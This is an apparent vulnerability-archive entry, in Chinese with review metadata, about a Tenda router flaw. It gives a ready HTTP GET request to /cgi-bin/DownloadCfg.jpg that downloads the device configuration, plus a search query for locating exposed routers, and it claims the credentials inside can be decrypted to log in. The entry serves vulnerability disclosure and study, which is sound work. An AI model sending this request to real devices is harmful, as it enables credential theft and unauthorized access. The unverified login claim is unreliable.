---
source: "wy876 漏洞文库"
id: "vw-a9323fefacc735b1b99eafd4"
entity_id: "ve-a9323fefacc735b1b99eafd4"
schema_version: "1"
fofa_unverified: "web.title="
title: "Tenda 路由器 DownloadCfg 信息泄露漏洞"
product: "Tenda路由器，型号未知"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "仅lang Cookie，无型号固件"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87/Tenda%E8%B7%AF%E7%94%B1%E5%99%A8DownloadCfg%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gk3rgwxmuynm2p33"
source_status: "recorded"
---

# Tenda 路由器 DownloadCfg 信息泄露漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Tenda路由器，型号未知
- 本文讨论：cgi-bin/DownloadCfg.jpg配置下载
- 版本、权限与配置前提：仅lang Cookie，无型号固件
- 资料类型：配置泄露PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 账号密码解密无算法/字段/响应，不能据URL断言可以登录
- 无限路由器笔误，Hunter元数据截断，Tenda错误混放其他设备
- 同品牌配置功能是否正常授权需要明确
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 加密/固件/鉴权和修复待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞描述
Tenda 路由器是深圳市吉祥腾达科技有限公司的一款智能无限路由器。Tenda 路由器存在信息泄露漏洞，攻击者通过构造特殊 URL 地址，读取系统敏感信息网访问该系统。

# 二、影响版本
+ Tenda 路由器

# 三、资产测绘
+ hunter`web.title="Tenda | LOGIN"`
+ 特征


# 四、漏洞复现
```http
GET /cgi-bin/DownloadCfg.jpg HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: lang=cn,en
Upgrade-Insecure-Requests: 1
```


从配置文件中可找到系统账号密码


解密后成功登录系统


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gk3rgwxmuynm2p33>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
